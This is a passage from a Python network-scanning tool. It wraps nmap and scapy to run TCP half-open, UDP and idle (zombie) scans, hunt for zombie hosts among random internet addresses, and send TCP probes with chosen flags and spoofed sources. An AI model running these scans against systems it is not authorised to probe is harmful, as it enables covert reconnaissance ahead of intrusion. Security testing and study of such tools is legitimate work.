                                    print("Reason => ",tcp_half_scan['scan'][addr[0]]['status']['reason'])
                                    print("Uphost => ",tcp_half_scan['nmap']['scanstats']['uphosts'])
                                    print("Downhost => ",tcp_half_scan['nmap']['scanstats']['downhosts'])
                                    print("Elapsed => ",tcp_half_scan['nmap']['scanstats']['elapsed'])
                                    print("Method => ",tcp_half_scan['nmap']['scaninfo']['tcp']['method'])
                                    print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ₱ØⱤ₮ ⱤɆ₴ɄⱠ₮ ⪻ - ─╤̵̵͇╦︻------------->>")
                                    if bool(port_2)==True:
                                       for i in range(int(port_1),(int(port_2)+1)):
                                           for key,value in tcp_half_scan['scan'][addr[0]]['tcp'][i].items():
                                               print("Port No. => ",i)
                                               print("Port Name => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['name'])
                                               print("State => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['state'])
                                               print("Reason => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['reason'])
                                               print("Product => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['product'])
                                               print("Version info => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['version'])
                                               print("Conf => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['conf'])
                                               print("Cpe => ",tcp_half_scan['scan'][addr[0]]['tcp'][i]['cpe'])
                                               print("X---------------🚫---------------X")
                                               break
                                    else:
                                      for key,value in tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)].items():
                                          print("Port No. => ",int(port_1))
                                          print("Port Name => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['name'])
                                          print("State => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['state'])
                                          print("Reason => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['reason'])
                                          print("Product => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['product'])
                                          print("Version info => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['version'])
                                          print("Conf => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['conf'])
                                          print("Cpe => ",tcp_half_scan['scan'][addr[0]]['tcp'][int(port_1)]['cpe'])
                                          print("X--------------🚫--------------X")
                                          break
                                 else:
                                   print("Uphost => ",tcp_half_scan['nmap']['scanstats']['uphosts'])
                                   print("Downhost => ",tcp_half_scan['nmap']['scanstats']['downhosts'])
                                   print("Elapsed => ",tcp_half_scan['nmap']['scanstats']['elapsed'])
                                   print("Sorry Maam it seems that your host is down...😟")
                            tcp_scan_half(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else tcp_scan_half(main_port=port_1) 
                         else:
                            def udp_scan_attack(multiple_ports='',main_port=''):
                                 udp_scan={}
                                 if bool(multiple_ports)==False:
                                    scanning_text13="(っ ‘o’)ﾉ⌒ ~ ː̗̤̣̀̈̇ː̖́.•"
                                    for scan in scanning_text13:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("") 
                                    udp_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=main_port,arguments=f"-sU -sV -e {interface_val}")
                                 else:
                                    scanning_text14=" ╰༼.◕ヮ◕.༽つ¤=[]———— (˚▽˚’!)/ "
                                    for scan in scanning_text14:
                                        print(scan,end="",flush=True)
                                        s(0.1)
                                    print("")
                                    udp_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{main_port}-{multiple_ports}",arguments=f"-sU -sV -e {interface_val}")
                                 downhost=udp_scan['nmap']['scanstats']['downhosts']
                                 print("<<--------------乂 Ścₐꪦ ꭱɇᎦůḽ𝘵 乂----------------->>")
                                 print("Scan Time => ",udp_scan['nmap']['scanstats']['timestr'])
                                 if downhost=='0':
                                    addr=nmap_scanner.all_hosts()
                                    print("Target IP => ",addr[0])
                                    def mac_address(addr):
                                        for key,value in udp_scan['scan'][addr]['addresses'].items():
                                            if key=='mac':
                                               return value
                                    mac_value=mac_address(addr[0])
                                    print("Target Mac => ",mac_value)
                                    if  bool(udp_scan['scan'][addr[0]]['vendor'])==True:
                                        print("Vendor => ",udp_scan['scan'][addr[0]]['vendor'][mac_value])
                                    print("State => ",udp_scan['scan'][addr[0]]['status']['state'])
                                    print("Reason => ",udp_scan['scan'][addr[0]]['status']['reason'])
                                    print("Uphost => ",udp_scan['nmap']['scanstats']['uphosts'])
                                    print("Downhost => ",udp_scan['nmap']['scanstats']['downhosts'])
                                    print("Elapsed => ",udp_scan['nmap']['scanstats']['elapsed'])
                                    print("Method => ",udp_scan['nmap']['scaninfo']['udp']['method'])
                                    print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ₱ØⱤ₮ ⱤɆ₴ɄⱠ₮ ⪻ - ─╤̵̵͇╦︻------------->>")
                                    if bool(port_2)==True:
                                       for i in range(int(port_1),(int(port_2)+1)):
                                           for key,value in udp_scan['scan'][addr[0]]['udp'][i].items():
                                               print("Port No. => ",i)
                                               print("Port Name => ",udp_scan['scan'][addr[0]]['udp'][i]['name'])
                                               print("State => ",udp_scan['scan'][addr[0]]['udp'][i]['state'])
                                               print("Reason => ",udp_scan['scan'][addr[0]]['udp'][i]['reason'])
                                               print("Product => ",udp_scan['scan'][addr[0]]['udp'][i]['product'])
                                               print("Version info => ",udp_scan['scan'][addr[0]]['udp'][i]['version'])
                                               print("Conf => ",udp_scan['scan'][addr[0]]['udp'][i]['conf'])
                                               print("Cpe => ",udp_scan['scan'][addr[0]]['udp'][i]['cpe'])
                                               print("X---------------🚫---------------X")
                                               break
                                    else:
                                      for key,value in udp_scan['scan'][addr[0]]['udp'][int(port_1)].items():
                                          print("Port No. => ",int(port_1))
                                          print("Port Name => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['name'])
                                          print("State => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['state'])
                                          print("Reason => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['reason'])
                                          print("Product => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['product'])
                                          print("Version info => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['version'])
                                          print("Conf => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['conf'])
                                          print("Cpe => ",udp_scan['scan'][addr[0]]['udp'][int(port_1)]['cpe'])
                                          print("X--------------🚫--------------X")
                                          break
                                 else:
                                   print("Uphost => ",udp_scan['nmap']['scanstats']['uphosts'])
                                   print("Downhost => ",udp_scan['nmap']['scanstats']['downhosts'])
                                   print("Elapsed => ",udp_scan['nmap']['scanstats']['elapsed'])
                                   print("Sorry Maam it seems that your host is down...😟")
                            udp_scan_attack(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else udp_scan_attack(main_port=port_1)
                    else:
                        D.zombie_design()
                        print("")
                        def zombie_scan(multiple_ports='',main_port=''):
                            print("Maam in this Attack 1st you have to find 🧟 zombie device 🧟 or vulnerabale device you can also find by using metasploit")
                            zombie=input("Have you found the Zombiesss🧟 [y/n]:- ")
                            if zombie=='n':
                                def vuln_scan(ipprefix='',ipfirstrange='',iplastrange='',public_rand='',main_port1='',multiple_ports1=''):
                                    vuln_scan_attack={}
                                    manual_address=[]
                                    address_range=[]
                                    if bool(public_rand)==True:
                                        scanning_text15=" (　-_･) ︻デ═一 ▸ - - - -🧟⟫𝑍ₒꪑᵦίᶓₛ ꋫ𝗿ᶓ ȼ๏ꪑίⁿ𝚐⟪🧟"
                                        for scan in scanning_text15:
                                            print(scan,end="",flush=True)
                                            s(0.1)
                                        print("")
                                        if bool(multiple_ports1)==False:
                                           vuln_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} --script ipidseq -iR {public_rand} -sV -p {main_port1}")
                                        else:
                                           vuln_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} --script ipidseq -iR {public_rand} -sV -p {main_port1}-{multiple_ports1}")
                                    else:
                                       if bool(multiple_ports1)==True:
                                          scanning_text16="( う-´)づ︻╦̵̵̿╤── - - - - ⌐(×▵×⌐҂)"
                                          for scan in scanning_text16:
                                              print(scan,end="",flush=True)
                                              s(0.1)
                                          print("")
                                          for ippostfix in range(ipfirstrange,iplastrange+1): 
                                              ippostfix_str=str(ippostfix)    
                                              full_ip=ipprefix+f".{ippostfix_str}"
                                              vuln_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} --script ipidseq {full_ip} -sV -p {main_port1}-{multiple_ports1}")
                                              dhost=vuln_scan_attack['nmap']['scanstats']['downhosts']
                                              if dhost=='0':
                                                 manual_address.append(vuln_scan_attack)
                                                 address_range.append(full_ip)
                                       else:
                                          for ippostfix in range(ipfirstrange,iplastrange+1):   
                                              ippostfix_str=str(ippostfix)  
                                              full_ip=ipprefix+f".{ippostfix_str}"
                                              vuln_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} --script ipidseq {full_ip} -sV -p {main_port1}")
                                              dhost=vuln_scan_attack['nmap']['scanstats']['downhosts']
                                              if dhost=='0':
                                                 manual_address.append(vuln_scan_attack)
                                                 address_range.append(full_ip)
                                    addr=nmap_scanner.all_hosts()
                                    if bool(address_range)==True:
                                         print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ🧟 ˚ƑіᴻÐ Ƭℎₑ Ź𝓸๓多іₑ𐍃˚ 🧟 ⪻ - ─╤̵̵͇╦︻------------->>")
                                         if bool(multiple_ports)==True:
                                            j=0
                                            for m in address_range: 
                                                m_str=str(m)
                                                for i in range(int(main_port1),(int(multiple_ports1)+1)):
                                                    for key,value in manual_address[j]['scan'][m_str]['tcp'][i].items():
                                                        print("IP Address:- ",m)
                                                        print("Uphost => ",manual_address[j]['nmap']['scanstats']['uphosts'])
                                                        print("Downhost => ",manual_address[j]['nmap']['scanstats']['downhosts'])
                                                        print("Port No. => ",i)
                                                        print("Port Name => ",manual_address[j]['scan'][m_str]['tcp'][i]['name'])
                                                        print("State => ",manual_address[j]['scan'][m_str]['tcp'][i]['state'])
                                                        print("Reason => ",manual_address[j]['scan'][m_str]['tcp'][i]['reason'])
                                                        print("Product => ",manual_address[j]['scan'][m_str]['tcp'][i]['product'])
                                                        print("Version info => ",manual_address[j]['scan'][m_str]['tcp'][i]['version'])
                                                        print("Conf => ",manual_address[j]['scan'][m_str]['tcp'][i]['conf'])
                                                        print("Cpe => ",manual_address[j]['scan'][m_str]['tcp'][i]['cpe'])
                                                        if 'hostscript' in manual_address[j]['scan'][m_str]:
                                                            print("IpIdSeq => ",manual_address[j]['scan'][m_str]['hostscript'][0]['output'])
                                                        print("X---------------🚫---------------X")
                                                        break
                                                j+=1          
                                         else:
                                           l=0
                                           for k in address_range:                                              
                                               k_str=str(k)
                                               for key,value in manual_address[l]['scan'][k_str]['tcp'][int(main_port)].items():
                                                    print("IP Address:- ",k)
                                                    print("Uphost => ",manual_address[l]['nmap']['scanstats']['uphosts'])
                                                    print("Downhost => ",manual_address[l]['nmap']['scanstats']['downhosts'])
                                                    print("Port No. => ",int(main_port))
                                                    print("Port Name => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['name'])
                                                    print("State => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['state'])
                                                    print("Reason => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['reason'])
                                                    print("Product => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['product'])
                                                    print("Version info => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['version'])
                                                    print("Conf => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['conf'])
                                                    print("Cpe => ",manual_address[l]['scan'][k_str]['tcp'][int(port_1)]['cpe'])
                                                    if 'hostscript' in manual_address[l]['scan'][k_str]:
                                                        print("IpIdSeq => ",manual_address[l]['scan'][k_str]['hostscript'][0]['output'])
                                                    print("X--------------🚫--------------X")
                                                    break
                                               l+=1                
                                    else:
                                      print("<<--------------︻╦̵̵͇╤─ - ⪼ㅤ🧟 ˚ƑіᴻÐ Ƭℎₑ Ź𝓸๓多іₑ𐍃˚ 🧟 ⪻ - ─╤̵̵͇╦︻------------->>")
                                      if bool(addr)==False:
                                         print("Sorry Maam No Hosts Found....😔")
                                      else:
                                        if bool(multiple_ports)==True:
                                           for j in addr:
                                               for i in range(int(main_port1),(int(multiple_ports1)+1)):
                                                   for key,value in vuln_scan_attack['scan'][j]['tcp'][i].items():
                                                       print("IP Address:- ",j)
                                                       print("Port No. => ",i)
                                                       print("Port Name => ",vuln_scan_attack['scan'][j]['tcp'][i]['name'])
                                                       print("State => ",vuln_scan_attack['scan'][j]['tcp'][i]['state'])
                                                       print("Reason => ",vuln_scan_attack['scan'][j]['tcp'][i]['reason'])
                                                       print("Product => ",vuln_scan_attack['scan'][j]['tcp'][i]['product'])
                                                       print("Version info => ",vuln_scan_attack['scan'][j]['tcp'][i]['version'])
                                                       print("Conf => ",vuln_scan_attack['scan'][j]['tcp'][i]['conf'])
                                                       print("Cpe => ",vuln_scan_attack['scan'][j]['tcp'][i]['cpe'])
                                                       if 'hostscript' in vuln_scan_attack['scan'][j]:
                                                           print("IpIdSeq => ",vuln_scan_attack['scan'][j]['hostscript'][0]['output'])
                                                       print("X---------------🚫---------------X")
                                                       break
                                        else:
                                           for k in addr:
                                               for key,value in vuln_scan_attack['scan'][k]['tcp'][int(main_port)].items():
                                                   print("IP Address:- ",k)
                                                   print("Port No. => ",int(main_port))
                                                   print("Port Name => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['name'])
                                                   print("State => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['state'])
                                                   print("Reason => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['reason'])
                                                   print("Product => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['product'])
                                                   print("Version info => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['version'])
                                                   print("Conf => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['conf'])
                                                   print("Cpe => ",vuln_scan_attack['scan'][k]['tcp'][int(port_1)]['cpe'])
                                                   if 'hostscript' in vuln_scan_attack['scan'][k]:
                                                       print("IpIdSeq => ",vuln_scan_attack['scan'][k]['hostscript'][0]['output'])
                                                   print("X--------------🚫--------------X")
                                                   break
                                print("Hint:-  Maam plz note that you have to find the incremental word from the ipidseq of an ip if you find then that would be the zombie device that ip you'll take Maam...( *´ ω｀* )")
                                random_ip=input("Maam Do you want to give random ip...[y/n]:- ")
                                if random_ip=='y':
                                    ip_numberss=input("Okk Now just give the number that you want to find some zombies...⌐(×▵×⌐҂):- ")
                                    vuln_scan(public_rand=ip_numberss,main_port1=main_port,multiple_ports1=multiple_ports)if bool(port_2)==True else vuln_scan(public_rand=ip_numberss,main_port1=main_port) 
                                else:
                                   prefix_ip=input("Maam give the 3 bytes of an ip 🤩:- ")
                                   range1=int(input("Maam give the 1st range ( ｡･ ω ･｡ )ﾉ♡ :- "))
                                   range2=int(input("Also give the 2nd range (*˘︶˘*).｡*♡ :- "))
                                   vuln_scan(ipprefix=prefix_ip,ipfirstrange=range1,iplastrange=range2,main_port1=main_port,multiple_ports1=multiple_ports)if bool(multiple_ports)==True else vuln_scan(ipprefix=prefix_ip,ipfirstrange=range1,iplastrange=range2,main_port1=main_port)
                            else:
                               print("Okk Maam i will assume that you've already found a zombie device...👻")   
                            zombie_ip=input("Now let's give the zombie ip ⌐(×▵×⌐҂) :- ") 
                            zombie_port=input("you can choose the port which is open for an zombie ip or you can leave it:- ")
                            zombie_scan_attack={}
                            if bool(multiple_ports)==False:
                                scanning_text18="(ง ͠ ᵒ̌ Дᵒ̌)¤=[]:::::> Ꭰэꪋԃ 𝙢эꫜ ꪋ𝐫ė ｗαไк𝗂ꫜ𝗴"
                                for scan in scanning_text18:
                                    print(scan,end="",flush=True)
                                    s(0.1)
                                print("")
                                if bool(zombie_port)==True:
                                   zombie_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} -Pn -sI {zombie_ip}:{zombie_port} {target_ip_addr} -p {main_port} -v ") 
                                else: 
                                  zombie_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} -Pn -sI {zombie_ip} {target_ip_addr} -p {main_port} -v ")
                            else:
                                scanning_text19="ヾ(;ﾟ⊿ﾟ)ﾉ *～●… 🧟"
                                for scan in scanning_text19:
                                    print(scan,end="",flush=True)
                                    s(0.1)
                                print("")
                                if bool(zombie_port)==True:
                                   zombie_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} -Pn -sI {zombie_ip}:{zombie_port} {target_ip_addr} -p {main_port}-{multiple_ports} -v ") 
                                else: 
                                  zombie_scan_attack=nmap_scanner.scan(f"nmap -e {interface_val} -Pn -sI {zombie_ip} {target_ip_addr} -p {main_port}-{multiple_ports} -v ")
                            for key,value in zombie_scan_attack.items():
                                if bool(zombie_scan_attack['scan'])==True:
                                    zombies_output=json.dumps(zombie_scan_attack['scan'],indent=4)
                                    print(zombies_output)
                                else:
                                    zombies_output=json.dumps(zombie_scan_attack['nmap'],indent=4)
                                    print(zombies_output)
                        zombie_scan(multiple_ports=port_2,main_port=port_1)if bool(port_2)==True else zombie_scan(main_port=port_1)          
              elif scanning_inp==2:
                   D.tcp_scanner()
                   print("")
                   tcp_doom = """
=================     ===============     ===============   ========  ========
\\\\ . . . . . . .\\\\   //. . . . . . .\\\\   //. . . . . . .\\\\  \\\\. . .\\\\// . . //
||. . ._____. . .|| ||. . ._____. . .|| ||. . ._____. . .|| || . . .\/ . . .||
|| . .||   ||. . || || . .||   ||. . || || . .||   ||. . || ||. . . . . . . ||
||. . ||   || . .|| ||. . ||   || . .|| ||. . ||   || . .|| || . | . . . . .||
|| . .||   ||. _-|| ||-_ .||   ||. . || || . .||   ||. _-|| ||-_.|\ . . . . ||
||. . ||   ||-'  || ||  `-||   || . .|| ||. . ||   ||-'  || ||  `|\_ . .|. .||
|| . _||   ||    || ||    ||   ||_ . || || . _||   ||    || ||   |\ `-_/| . ||
||_-' ||  .|/    || ||    \|.  || `-_|| ||_-' ||  .|/    || ||   | \  / |-_.||
||    ||_-'      || ||      `-_||    || ||    ||_-'      || ||   | \  / |  `||
||    `'         || ||         `'    || ||    `'         || ||   | \  / |   ||
||            .===' `===.         .==='.`===.         .===' /==. |  \/  |   ||
||         .=='   \_|-_ `===. .==='   _|_   `===. .===' _-|/   `==  \/  |   ||
||      .=='    _-'    `-_  `='    _-'   `-_    `='  _-'   `-_  /|  \/  |   ||
||   .=='    _-'          `-__\._-'         `-_./__-'         `' |. /|  |   ||
||.=='    _-'                                                     `' |  /==.||
=='    _-'                                                            \/   `==
\   _-'                                                                `-_   /
 `''                                                                      ``'

"""
                   print(colored(tcp_doom,"red",attrs=['bold']))
                   port_inp=input("Select the port number(1-65535) for your device or you can leave it blank ( ╹ ▽ ╹ ) :- ")
                   target_port=int(input("Please enter the port number that you want to find to target ip (ノ^_^)ノ :- "))
                   D.tcp_flags()
                   flags_set=input("Maam you can also take the TCP flags or press default=1 :- ")
                   tcpflags={
                    "S":1,"SA":2,
                    "SR":3,"SU":4,
                    "SF":5,"R":6,
                    "RA":7,"RU":8,
                    "RF":9,"U":10,
                    "UA":11,"UF":12,
                    "F":13,"FA":14,
                    "A":15,"PA":16,
                    "PR":17,"PU":18,
                    "PU":19,"PF":20,
                    "PS":21,"FPU":22,
                    "":23
                   }
                   def set_flags(flag_set):
                       for key_flag,value_flag in tcpflags.items():
                           if value_flag==flag_set:
                              return key_flag
                   flagset=''
                   if bool(flags_set)==True:
                      flagset=set_flags(int(flags_set))
                   else:
                     flagset='S'
                   port_bool=bool(port_inp)
                   if port_bool==True:
                      port_num=int(port_inp)
                      def tcp_scanning(port_num,flagsss,saddr=my_ip):   
                          multiple_ports=input("Do you want to find multiple ports maam [y/n]:- ")  
                          if multiple_ports=='y':
                             target_port_2=int(input("Maam please take the 2nd port you have to give bigger number from the first port which u've already given ( ◠ ‿ ◕ ):- "))
                             sending_themes4="༺°•Ｓёá𝑟cʰⅈꫛ𝖌𝖌𝖌•°ᴮᵒˢˢ°༻"
                             for b in sending_themes4:
                                 print(b,end="",flush=True)
                                 s(0.2)
                             print("")
                             if num_of_layer==3:
                                tcp_attack=sr(IP(src=saddr,dst=target_ip_addr)/TCP(sport=port_num,dport=(target_port,target_port_2),flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                             else:
                                tcp_attack=srp(Ether()/IP(src=saddr,dst=target_ip_addr)/TCP(sport=port_num,dport=(target_port,target_port_2),flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                             def tcp_scan_report():
                                  if tcp_attack[0]:
                                     tcp_ports=[]
                                     port_names=[]
                                     tcp_flag=[]
                                     tcp_status=[]
                                     ip_checksum=[]
                                     tcp_checksum=[]
                                     for s,r in tcp_attack[0]:
                                         if r[TCP].flags=="SA":
                                            tcp_status.append("Open(👹)")
                                         elif r[TCP].flags=="RA":
                                             tcp_status.append("Close(😟)")
                                         elif r[TCP].flags=="R":
                                              tcp_status.append("Probability of Exploitation(😈)")
                                         else:
                                            tcp_status.append("No-Connection(👾)")
                                     for s,r in tcp_attack[0]:
                                         tcp_ports.append(r[TCP].sport)
                                         tcp_flag.append(r[TCP].flags)
                                         tcp_checksum.append(r.sprintf("%TCP.chksum%"))
                                         ip_checksum.append(r.sprintf("%IP.chksum%"))
                                         port_names.append(r.sprintf("%TCP.sport%"))
                                     return tcp_ports,port_names,ip_checksum,tcp_checksum,tcp_flag,tcp_status
                                  else:
                                    pass
                             if tcp_attack[0]:
                                tcp_report=tcp_scan_report()
                                tcp_report_table=tabular()
                                tcp_report_table.title=f"😈 Network Vulnerability Assessment Report for {target_ip_addr} 😈"
                                tcp_report_table.field_names=['Serial No.','Ports','Port Names','IP CheckSum','TCP CheckSum','Flags','Status Check']
                                a=0
                                for i,j,k,l,m,n in zip(tcp_report[0],tcp_report[1],tcp_report[2],tcp_report[3],tcp_report[4],tcp_report[5]):
                                    a+=1
                                    tcp_report_table.add_row([a,i,j,k,l,m,n])
                                print(tcp_report_table)
                                info_port=input("Maam do you want to need more information[y/n]:- ")
                                if info_port=='y':
                                   for infoo in tcp_attack[0]:
                                       info_ip=infoo[1][0]
                                       print(info_ip.show())
                                   tcp_save=input("Do you want to save it in a file maam( ✿ ^ ‿ ^ ) [y/n]:- ")
                                   if tcp_save=='y':
                                      tcp_mul_s=input("Maam plz set the file name that you want to save it ( ◍ • ᴗ • ◍ )❤ :- ")
                                      tcp_mul_save=directory+tcp_mul_s+".txt"
                                      with open(tcp_mul_save,"w") as t:
                                          for g in tcp_attack[0]:
                                              t.write(str(g[1]))
                                              t.write("\n")
                                      bar=progressbar.ProgressBar(maxval=50,widgets=[' ༺  ',progressbar.AnimatedMarker(),"...☆ 𝑮еₙě𝚛ᵅťīₙ𝙜 ☆...",
                                      progressbar.AnimatedMarker(),'༻ ',progressbar.Bar(left=' [',right=']'),' (',progressbar.ETA(),') ']).start()
                                      for i in range(50):
                                          bar.update(i)
                                          s(0.2)
                                      print("")
                                      print(f"Your file save is:- {tcp_mul_save}")
                                      system(f"dbus-launch gnome-terminal -q --command 'nano {tcp_mul_save}'")
                                      print("Thanks for save it Maam, it could be better understanding for you...😌")
                                   else:
                                      print("No issues Maam( ◜ ‿ ◝ )♡...i will definitely do whatever you want....")
                             else:
                                for infoo2 in tcp_attack[1]:
                                    info_ip2=infoo2[0]
                                    print(info_ip2.show())
                                print("Sorry maam no host found....🥺") 
                          else:
                              searching_text="⌐╦╦═─ ✑ ✑ ✑ ✑ ✑ ✑ 乂❤‿❤乂"
                              for b in searching_text:
                                  print(b,end="",flush=True)
                                  s(0.2)
                              print("")     
                              if num_of_layer==3:                    
                                 tcp_attack=sr(IP(src=saddr,dst=target_ip_addr)/TCP(sport=port_num,dport=target_port,flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                              else:
                                tcp_attack=srp(Ether()/IP(src=saddr,dst=target_ip_addr)/TCP(sport=port_num,dport=target_port,flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                              def tcp_scan_report():
                                  if tcp_attack[0]:
                                     tcp_ports=[]
                                     port_names=[]
                                     tcp_flag=[]
                                     tcp_status=[]
                                     tcp_checksum=[]
                                     ip_checksum=[]
                                     for s,r in tcp_attack[0]:
                                         if r[TCP].flags=="SA":
                                            tcp_status.append("Open(👹)")
                                         elif r[TCP].flags=="RA":
                                             tcp_status.append("Close(😟)")
                                         elif r[TCP].flags=="R":
                                              tcp_status.append("Probability of Exploitation(😈)")
                                         else:
                                            tcp_status.append("No-Connection(👾)")
                                     for s,r in tcp_attack[0]:
                                         tcp_ports.append(r[TCP].sport)
                                         tcp_flag.append(r[TCP].flags)
                                         tcp_checksum.append(r.sprintf("%TCP.chksum%"))
                                         ip_checksum.append(r.sprintf("%IP.chksum%"))
                                         port_names.append(r.sprintf("%TCP.sport%"))
                                     return tcp_ports,port_names,ip_checksum,tcp_checksum,tcp_flag,tcp_status
                                  else:
                                    pass
                              if bool(tcp_attack[0])==True:
                                 tcp_report=tcp_scan_report()
                                 tcp_report_table=tabular()
                                 tcp_report_table.title=f"🔍 Network Reconnaissance Report for {target_ip_addr} 🔎"
                                 tcp_report_table.field_names=['Port','Port Name','IP CheckSum','TCP CheckSum','Flag','Status Check']
                                 for i,j,k,l,m,n in zip(tcp_report[0],tcp_report[1],tcp_report[2],tcp_report[3],tcp_report[4],tcp_report[5]):
                                     tcp_report_table.add_row([i,j,k,l,m,n])
                                 print(tcp_report_table)
                                 info_port=input("Maam do you want to need more information[y/n]:- ")
                                 if info_port=='y':
                                    for infoo in tcp_attack[0]:
                                        info_ip=infoo[1][0]
                                        print(info_ip.show())
                                    print("Byee Byee maam...( ´◡  ‿  ◡`)")
                                 else:
                                   print("See you later....😉")
                              else:
                                  for infoo2 in tcp_attack[1]:
                                      info_ip2=infoo2[0]
                                      print(info_ip2.show())
                                  print("Sorry maam no host found....🥺")
                      source_addr=input("Maam do you want to give other ip address then type that ip or leave it blank if you give then most of the time it won't give any answer ( ｡ •́ ︿ •̀ ｡ ):- ")         
                      if bool(source_addr)==True:
                         tcp_scanning(port_num,flagset,source_addr)
                      else:
                          tcp_scanning(port_num,flagset)
                   else:
                        def tcp_scanning(flagsss,saddr=my_ip):   
                          multiple_ports=input("Do you want to find multiple ports maam [y/n]:- ")  
                          if multiple_ports=='y':
                             target_port_2=int(input("Maam please take the 2nd port you have to give bigger number from the first port which u've already given ( ◠ ‿ ◕ ):- "))
                             searching_text="(҂`_´) ,︻╦̵̵̿╤─ ҉ - -- -- -- -- -- 🤯"
                             for c in searching_text:
                                 print(c,end="",flush=True)
                                 s(0.1)
                             print("") 
                             if num_of_layer==2:
                                tcp_attack=srp(Ether()/IP(src=saddr,dst=target_ip_addr)/TCP(dport=(target_port,target_port_2),flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                             else:
                                tcp_attack=sr(IP(src=saddr,dst=target_ip_addr)/TCP(dport=(target_port,target_port_2),flags=flagsss),timeout=5,verbose=False,iface=interface_val)
                             if tcp_attack[0]:
                                def tcp_scan_report():
                                  if tcp_attack[0]:
                                     tcp_ports=[]
                                     port_names=[]
                                     tcp_flag=[]
                                     tcp_status=[]
                                     ip_checksum=[]
                                     tcp_checksum=[]
                                     for s,r in tcp_attack[0]:
                                         if r[TCP].flags=="SA":
                                            tcp_status.append("Open(👹)")
                                         elif r[TCP].flags=="RA":
                                             tcp_status.append("Close(😟)")
                                         elif r[TCP].flags=="R":
                                              tcp_status.append("Probability of Exploitation(😈)")
                                         else:
                                            tcp_status.append("No-Connection(👾)")
                                     for s,r in tcp_attack[0]:
                                         tcp_ports.append(r[TCP].sport)
                                         tcp_flag.append(r[TCP].flags)
                                         tcp_checksum.append(r.sprintf("%TCP.chksum%"))
                                         ip_checksum.append(r.sprintf("%IP.chksum%"))
                                         port_names.append(r.sprintf("%TCP.sport%"))
                                     return tcp_ports,port_names,ip_checksum,tcp_checksum,tcp_flag,tcp_status
                                  else:
                                    pass
                             if tcp_attack[0]:
                                tcp_report=tcp_scan_report()
                                tcp_report_table=tabular()
                                tcp_report_table.title=f"😈 Network Vulnerability Assessment Report for {target_ip_addr} 😈"
                                tcp_report_table.field_names=['Serial No.','Ports','Port Names','IP CheckSum','TCP CheckSum','Flags','Status Check']
                                a=0
                                for i,j,k,l,m,n in zip(tcp_report[0],tcp_report[1],tcp_report[2],tcp_report[3],tcp_report[4],tcp_report[5]):
                                    a+=1
                                    tcp_report_table.add_row([a,i,j,k,l,m,n])
                                print(tcp_report_table)
                                info_port=input("Maam do you want to need more information[y/n]:- ")
                                if info_port=='y':
                                   for infoo in tcp_attack[0]:
                                       info_ip=infoo[1][0]
                                       print(info_ip.show())
                                   tcp_save=input("Do you want to save it in a file maam( ✿ ^ ‿ ^ ) [y/n]:- ")
                                   if tcp_save=='y':
                                      tcp_mul_s=input("Maam plz set the file name that you want to save it ( ◍ • ᴗ • ◍ )❤ :- ")
                                      tcp_mul_save=directory+tcp_mul_s+".txt"
                                      with open(tcp_mul_save,"w") as t:
                                          for g in tcp_attack[0]:
                                              t.write(str(g[1]))
                                              t.write("\n")
                                      bar=progressbar.ProgressBar(maxval=100,widgets=[' ༺ ',"Ɠҽղҽɾąէìղց...",progressbar.AnimatedMarker(),'༻ ',progressbar.BouncingBar(marker="=",left=' [',right=']'),' (',progressbar.ETA(),') ']).start()
                                      for i in range(100):
                                          bar.update(i)
                                          s(0.1)
                                      print("")
                                      print(f"Your file save is:- {tcp_mul_save}")
                                      system(f"dbus-launch gnome-terminal -q --command 'nano {tcp_mul_save}'")
                                      print("Thanks for save it Maam, it could be better understanding for you...😌")
                                   else:
                                      print("No issues Maam( ◜ ‿ ◝ )♡...i will definitely do whatever you want....")
                                else:
                                     print("Byee byeee Maam....👋")
                             else:
